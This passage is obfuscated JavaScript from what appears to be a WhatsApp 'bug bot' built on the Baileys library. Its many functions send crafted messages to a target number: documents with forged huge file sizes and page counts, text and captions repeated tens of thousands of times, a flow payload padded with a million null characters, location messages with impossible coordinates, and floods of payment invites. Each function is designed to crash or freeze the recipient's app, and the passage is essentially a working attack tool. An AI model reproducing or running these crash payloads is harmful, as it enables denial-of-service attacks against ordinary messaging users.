        fileName: "⭑̤▾ ⿻ 𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌👑 ⿻ ▾⭑̤",
        fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
        directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1726867151",
        contactVcard: true,
        jpegThumbnail: _0x73a4db
      };
      const _0x29b488 = {
        documentMessage: _0x46a046,
        hasMediaAttachment: true
      };
      await _0x4b53e5.relayMessage(_0x52a013, {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: _0x29b488,
              body: {
                text: "⭑̤▾ ⿻ 𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌👑 ⿻ ▾⭑̤\n" + "\n\n\n\n\n\n\n\n\n\n\n\n@6283846077142".repeat(27000)
              },
              nativeFlowMessage: {
                messageParamsJson: "{}"
              },
              contextInfo: {
                mentionedJid: ["6283846077142@s.whatsapp.net"],
                forwardingScore: 1,
                isForwarded: true,
                fromMe: false,
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast",
                quotedMessage: {
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                    mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 1316134911,
                    mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                    fileName: "𝐌𝐲𝐬𝐭𝐞𝐫𝐢𝐨𝐮𝐬 𝐌𝐞𝐧 𝐈𝐧 𝐂𝐲𝐛𝐞𝐫𝐒𝐩𝐚𝐜𝐞♻️",
                    fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                    directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1724474503",
                    contactVcard: true,
                    thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                    thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                    thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                    jpegThumbnail: ""
                  }
                }
              }
            }
          }
        }
      }, _0x38af8f ? {
        participant: {
          jid: _0x52a013
        }
      } : {});
      console.log(_0x3e6b4d.green("Send Bug By ⭑̤▾ ⿻ 𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌👑 ⿻ ▾⭑"));
    }
    async function _0x4f1e72(_0xde8ccb, _0x498d7e, _0x2d8490 = true) {
      const _0x51fe50 = {
        url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
        fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
        fileLength: "9999999999999",
        pageCount: 1316134911,
        mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
        fileName: "⭑̤▾ ⿻ 𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌👑 ⿻ ▾⭑̤",
        fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
        directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1726867151",
        contactVcard: true,
        jpegThumbnail: _0x498d7e
      };
      const _0x57ca59 = {
        documentMessage: _0x51fe50,
        hasMediaAttachment: true
      };
      await _0x4b53e5.relayMessage(_0xde8ccb, {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: _0x57ca59,
              body: {
                text: "⭑̤▾ ⿻ 𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌👑 ⿻ ▾⭑̤\n" + "ꦾ".repeat(27000)
              },
              nativeFlowMessage: {
                messageParamsJson: "{}"
              },
              contextInfo: {
                mentionedJid: ["6283846077142@s.whatsapp.net"],
                forwardingScore: 1,
                isForwarded: true,
                fromMe: false,
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast",
                quotedMessage: {
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                    mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 1316134911,
                    mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                    fileName: "𝐌𝐲𝐬𝐭𝐞𝐫𝐢𝐨𝐮𝐬 𝐌𝐞𝐧 𝐈𝐧 𝐂𝐲𝐛𝐞𝐫𝐒𝐩𝐚𝐜𝐞♻️",
                    fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                    directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1724474503",
                    contactVcard: true,
                    thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                    thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                    thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                    jpegThumbnail: ""
                  }
                }
              }
            }
          }
        }
      }, _0x2d8490 ? {
        participant: {
          jid: _0xde8ccb
        }
      } : {});
      console.log(_0x3e6b4d.green("Send Bug By ⭑̤▾ ⿻ 𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌👑 ⿻ ▾⭑"));
    }
    async function _0x469e1b(_0x2913a6, _0x329d97, _0x38f7ec = true) {
      let _0x4d519c = generateWAMessageFromContent(_0x2913a6, proto.Message.fromObject({
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                  fileName: "⭑̤▾ ⿻ 𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌👑 ⿻ ▾⭑̤",
                  fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                  directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1726867151",
                  contactVcard: true,
                  jpegThumbnail: _0x329d97
                },
                hasMediaAttachment: true
              },
              body: {
                text: "⭑̤▾ ⿻ 𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌👑 ⿻ ▾⭑̤\n" + "Proses Membobol Data Bank".repeat(27000)
              },
              nativeFlowMessage: {
                messageParamsJson: "{}"
              },
              contextInfo: {
                mentionedJid: ["Proses Membobol Data Bank"],
                forwardingScore: 1,
                isForwarded: true,
                fromMe: false,
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast",
                quotedMessage: {
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                    mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 1316134911,
                    mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                    fileName: "𝐌𝐲𝐬𝐭𝐞𝐫𝐢𝐨𝐮𝐬 𝐌𝐞𝐧 𝐈𝐧 𝐂𝐲𝐛𝐞𝐫𝐒𝐩𝐚𝐜𝐞♻️",
                    fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                    directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1724474503",
                    contactVcard: true,
                    thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                    thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                    thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                    jpegThumbnail: ""
                  }
                }
              }
            }
          }
        }
      }), {
        userJid: _0x2913a6,
        quoted: EsQl
      });
      await _0x4b53e5.relayMessage(_0x2913a6, _0x4d519c.message, _0x38f7ec ? {
        participant: {
          jid: _0x2913a6
        }
      } : {});
      console.log(_0x3e6b4d.green("Send Bug By ⭑̤▾ ⿻ 𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌👑 ⿻ ▾⭑"));
    }
    async function _0x212e77(_0x131bca, _0x249bd8 = true) {
      await _0x4b53e5.relayMessage(_0x131bca, {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: {
                text: "⿻ 𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌👑 ⿻",
                format: "EXTENSIONS_1"
              },
              nativeFlowResponseMessage: {
                name: "galaxy_message",
                paramsJson: "{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"A NEW ERA ϟ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"⿻ 𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌👑 ⿻\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑̤▾ ⿻ 𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌👑 ⿻ ▾⭑̤" + "\0".repeat(1020000) + "\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}",
                version: 3
              }
            }
          }
        }
      }, _0x249bd8 ? {
        participant: {
          jid: _0x131bca
        }
      } : {});
      console.log(_0x3e6b4d.green("Send Bug By ⭑̤▾ ⿻ 𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌👑 ⿻ ▾⭑"));
    }
    async function _0x26f0aa(_0x88953a, _0x2e53c6) {
      var _0x553fd1 = generateWAMessageFromContent(_0x88953a, proto.Message.fromObject({
        pollCreationMessage: {
          name: "ꦾ".repeat(55000)
        },
        documentMessage: {
          contactVcard: true
        }
      }), {
        userJid: _0x88953a,
        quoted: _0x2e53c6
      });
      await _0x4b53e5.relayMessage(_0x88953a, _0x553fd1.message, {
        participant: {
          jid: _0x88953a,
          quoted: _0x2e53c6
        },
        messageId: _0x553fd1.key.id
      });
    }
    async function _0x2312e5(_0x4fbd50) {
      await _0x4b53e5.relayMessage(_0x4fbd50, {
        paymentInviteMessage: {
          serviceType: "UPI",
          expiryTimestamp: Date.now() + 5184000000
        }
      }, {
        participant: {
          jid: _0x4fbd50
        }
      });
    }
    async function _0x1991c0(_0xd63aa2) {
      await _0x4b53e5.relayMessage(_0xd63aa2, {
        paymentInviteMessage: {
          serviceType: "VENMO",
          expiryTimestamp: Date.now() + 5184000000
        }
      }, {
        participant: {
          jid: _0xd63aa2
        }
      });
    }
    async function _0x1f5af1(_0x57abfe) {
      await _0x4b53e5.relayMessage(_0x57abfe, {
        paymentInviteMessage: {
          serviceType: "CASHAPP",
          expiryTimestamp: Date.now() + 5184000000
        }
      }, {
        participant: {
          jid: _0x57abfe
        }
      });
    }
    async function _0xac6776(_0xe77e6a) {
      await _0x4b53e5.relayMessage(_0xe77e6a, {
        paymentInviteMessage: {
          serviceType: "SAMSUNGPAY",
          expiryTimestamp: Date.now() + 5184000000
        }
      }, {
        participant: {
          jid: _0xe77e6a
        }
      });
    }
    async function _0x3cb5ce(_0x386c55) {
      await _0x4b53e5.relayMessage(_0x386c55, {
        paymentInviteMessage: {
          serviceType: "SQUARE",
          expiryTimestamp: Date.now() + 5184000000
        }
      }, {
        participant: {
          jid: _0x386c55
        }
      });
    }
    async function _0x130828(_0x233724) {
      await _0x4b53e5.relayMessage(_0x233724, {
        paymentInviteMessage: {
          serviceType: "FBPAY",
          expiryTimestamp: Date.now() + 5184000000
        }
      }, {
        participant: {
          jid: _0x233724
        }
      });
    }
    async function _0x50b9e0(_0x2ac242) {
      let _0x44f2fa = "𑇂𑆵𑆴𑆿".repeat(60000);
      const _0x56f2bc = {
        degreesLatitude: 999.035,
        degreesLongitude: -999.035,
        name: _0x44f2fa,
        url: "https://youtube.com/@marxalone"
      };
      const _0x14def3 = {
        locationMessage: _0x56f2bc
      };
      await _0x4b53e5.relayMessage(_0x2ac242, _0x14def3, {
        participant: {
          jid: _0x2ac242
        }
      });
    }
    async function _0x5de1b1(_0x7b0097) {
      await _0x4b53e5.relayMessage(_0x7b0097, {
        paymentInviteMessage: {
          serviceType: "PAYPAL",
          expiryTimestamp: Date.now() + 5184000000
        }
      }, {
        participant: {
          jid: _0x7b0097
        }
      });
    }
    async function _0xf0edb0(_0x2a7848) {
      await _0x4b53e5.relayMessage(_0x2a7848, {
        paymentInviteMessage: {
          serviceType: "STRIPE",
          expiryTimestamp: Date.now() + 5184000000
        }
      }, {
        participant: {
          jid: _0x2a7848
        }
      });
    }
    async function _0x17cbaa(_0x535c03) {
      _0x4b53e5.relayMessage(_0x535c03, {
        extendedTextMessage: {
          text: "ꦾ".repeat(55000),
          contextInfo: {
            stanzaId: _0x535c03,
            participant: _0x535c03,
            quotedMessage: {
              conversation: "𝐂𝐇𝐔𝐂𝐊𝐘 𝐕𝟕" + "ꦾ࣯࣯".repeat(50000)
            },
            disappearingMode: {
              initiator: "CHANGED_IN_CHAT",
              trigger: "CHAT_SETTING"
            }
          },
          inviteLinkGroupTypeV2: "DEFAULT"
        }
      }, {
        paymentInviteMessage: {
          serviceType: "UPI",
          expiryTimestamp: Date.now() + 5184000000
        }
      }, {
        participant: {
          jid: _0x535c03
        }
      }, {
        messageId: null
      });
    }
    async function _0x237fbd(_0x46a318, _0x495efc = false) {
      await _0x4b53e5.relayMessage(_0x46a318, {
        extendedTextMessage: {
          text: "INVISIBLE ?" + "ꦾ".repeat(90000),
          contextInfo: {
            stanzaId: "1234567890ABCDEF",
            participant: "0@s.whatsapp.net",
            quotedMessage: {
              callLogMesssage: {
                isVideo: true,
                callOutcome: "1",
                durationSecs: "0",
                callType: "REGULAR",
                participants: [{
                  jid: "0@s.whatsapp.net",
                  callOutcome: "1"
                }]
              }
            },
            remoteJid: _0x46a318,
            conversionSource: "source_example",
            conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
            conversionDelaySeconds: 10,
            forwardingScore: 99999999,
            isForwarded: true,
            quotedAd: {
              advertiserName: "Example Advertiser",
              mediaType: "IMAGE",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
              caption: "This is an ad caption"
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890"
            },
            expiration: 86400,
            ephemeralSettingTimestamp: "1728090592378",
            ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
            externalAdReply: {
              title: "FINIX - CRITICAL FINISH",
              body: "📄⃟⃟⃟⃟⃚ ͢𝄽𝐓͋͢𝐀ᯭ𝐌͢𝐀 ͋𝐑͢𝐘ᯭ𝐔͢𝐈͋𝐂𝐇͢𝐈͋͢͢𝄽⃟⃟⃟☣️" + "𑜦࣯".repeat(200),
              mediaType: "VIDEO",
              renderLargerThumbnail: true,
              previewTtpe: "VIDEO",
              thumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
              sourceType: " x ",
              sourceId: " x ",
              sourceUrl: "https://www.instagram.com/WhatsApp",
              mediaUrl: "https://www.instagram.com/WhatsApp",
              containsAutoReply: true,
              renderLargerThumbnail: true,
              showAdAttribution: true,
              ctwaClid: "ctwa_clid_example",
              ref: "ref_example"
            },
            entryPointConversionSource: "entry_point_source_example",
            entryPointConversionApp: "entry_point_app_example",
            entryPointConversionDelaySeconds: 5,
            disappearingMode: {},
            actionLink: {
              url: "https://www.instagram.com/WhatsApp"
            },
            groupSubject: "Example Group Subject",
            parentGroupJid: "6287888888888-1234567890@g.us",
            trustBannerType: "trust_banner_example",
            trustBannerAction: 1,
            isSampled: false,
            utm: {
              utmSource: "utm_source_example",
              utmCampaign: "utm_campaign_example"
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "6287888888888-1234567890@g.us",
              serverMessageId: 1,
              newsletterName: " target ",
              contentType: "UPDATE",
              accessibilityText: " target "
            },
            businessMessageForwardInfo: {
              businessOwnerJid: "0@s.whatsapp.net"
            },
            smbClientCampaignId: "smb_client_campaign_id_example",
            smbServerCampaignId: "smb_server_campaign_id_example",
            dataSharingContext: {
              showMmDisclosure: true
            }
          }
        }
      }, _0x495efc ? {
        participant: {
          jid: _0x46a318
        }
      } : {});
    }
    async function _0x5aef34(_0xc31f4a) {
      _0x4b53e5.relayMessage(_0xc31f4a, {
        extendedTextMessage: {
          text: "⩟⬦𪲁 ��-�� -" + "࣯ꦾ".repeat(90000),
          contextInfo: {
            fromMe: false,
            stanzaId: _0xc31f4a,
            participant: _0xc31f4a,
            quotedMessage: {
              conversation: "⿻ᬃ𝐂𝐇𝐑𝐈𝐒𝐓𝐌𝐀𝐒 𝐂𝐑𝐀𝐒𝐇𝐄𝐑⃟⿻‌" + "ꦾ".repeat(90000)
            },
            disappearingMode: {
              initiator: "CHANGED_IN_CHAT",
              trigger: "CHAT_SETTING"
            }
          },
          inviteLinkGroupTypeV2: "DEFAULT"
        }
      }, {
        participant: {
          jid: _0xc31f4a
        }
      }, {
        messageId: null
      });
    }
    async function _0x45a30e(_0x29b7ca, _0x18e44c) {
      var _0x2be60b = generateWAMessageFromContent(_0x29b7ca, proto.Message.fromObject({
        videoMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/30023907_1714692856039684_5938907598213049306_n.enc?ccb=11-4&oh=01_Q5AaIEKWffjIEAibLK889RUHkqWhU5MVqjkybIoVwJm46uoa&oe=6753222A&_nc_sid=5e03e0&mms3=true",
          mimetype: "video/mp4",
          fileSha256: "o9LrGTJaHdYVWZF2UEN5RRap2JMkamsjYfs3ZPfpB4A=",
          fileLength: "236989",
          seconds: 18,
          mediaKey: "8SePyblqpUmoGyb3BP/5nAd3jydoH9HU8YZVDe/VWlU=",
          caption: "⩟⬦𪲁 ��-�� -\0\0\0" + "ꦾ".repeat(90000),
          height: 99999,
          width: 99999,
          fileEncSha256: "ABMHTzddlN1NzTAug/7LXAMrA22yJCdnhQTXoLDXQJ0=",
          directPath: "/v/t62.7161-24/30023907_1714692856039684_5938907598213049306_n.enc?ccb=11-4&oh=01_Q5AaIEKWffjIEAibLK889RUHkqWhU5MVqjkybIoVwJm46uoa&oe=6753222A&_nc_sid=5e03e0&_nc_hot=1730912455",
          mediaKeyTimestamp: "1730912449",
          jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAAkJCQkKCQoLCwoODw0PDhUTERETFR8WGBYYFh8wHiMeHiMeMCozKScpMypMOzU1O0xXSUVJV2pfX2qFf4WuruoBCQkJCQoJCgsLCg4PDQ8OFRMRERMVHxYYFhgWHzAeIx4eIx4wKjMpJykzKkw7NTU7TFdJRUlXal9faoV/ha6u6v/CABEIAKAAgAMBIgACEQEDEQH/xAAwAAABBQEBAAAAAAAAAAAAAAADAAECBAUGBwEBAQEBAAAAAAAAAAAAAAAAAAECA//aAAwDAQACEAMQAAAA8Yi0cJRg+o0TCp3jKk7RHg7KknGToO8pc1eFyvQkls7xSJJCSQk8hneROabjqY3mUm0qvSV063EnQ0k4zqQfoMnsOO+BJKETEYaGrFgV3IPvlJOjKRgEpwLSAPnTMarnZlUtIQjLFqwuA75E5DbyK5GriyrWxZCcK0061+ny3VuSnZFXerivyHsPntuAbrcyuYl01PEwI6g9THnpFKjCnDFNbUefu8xofquN6Rel1uZ0+fXdGLbXlo9DW1OHyukqXnizlKBzTKXJ0M2yjpZmlvPTavM6fHr1V/i9jOtmrRp1p8qXodZ4oCLrEWkGUVC1X1mper6FlmwMmNnsiFLu4N2qWOz4ToZeTUm1kdaQ7G2smMbTY1tbFkZ86NWtMZWhnWLklO/TX//EAC0QAAICAQMCBQMEAwEAAAAAAAECABEDBBIhBTEQE0FRYQYgIjAyUoEUFSNx/9oACAEBAAE/ANghQCGjNsKkS4D4CXCfu3tzcLNCxMD1N26EUYPCxCfuqbR7mVwfaFYVrxEJ/QqAg9xNq+1zbuHEZDf6dQLPUV29orcy49sKhBB+4CV448QagOTMH0/rMuDzvJYY/Vj2jCAGFSeRARfEpCOwuZVUdpXhUr7AJpSEZXPoZrfqzVZ+nY9AlLiX0WDtVxDyQYSBwI1gggxACAZlWmNfoDvPLdT8DuZndCKDWRxdQqD6zaUapkVdoMq4Er1MKEc1cYDxqVMODJmYJjUsx7ACZMbY2KsKI8A1rUIs0ATAeBZm8WbhZTQuDnsZbCbwVIYcw8+kqVKmPDkyXsUmhZqaXWZtExbE5Rqqx3mZ3ysX788mHcOTA4nmiBEBBe6mdsbO3lil9IpI4i/gLPMPAVmBo9ozL6CBbHMK89pUTCSu8ikBomDME3rhdgjcHnuPmZRXpMWWxsK8DnjuZmdWHaoYJnvgTyMjguiMQPUDibH31tNxlYKKXmYBkyZG3r2ExYMmTIEVdzu21R8mar6O1um0pzHMjELbARsZHeYsYJLNdVaj3moyF0TEq0EFXEUK3Ijbn5IEbHz/AB9o+Mqothz4An+Mz0TQMyLkYj/qa/8ATMOJQdxyGHLXYTSsg3uTQA9TPpXpuk12pyZsxKJj/YLqzOqdNwabE+TFqQV2N+BaY9GNwJ/I/M02lUqVoVsr+rudR0qYSoxrbPE6RnOEOcfcXM+mGCvMAEJ0vq3PvzMg0+QVvEGPTr7ExcAbldv9GDKL/KNk3HjgQMRxcxoxMTT7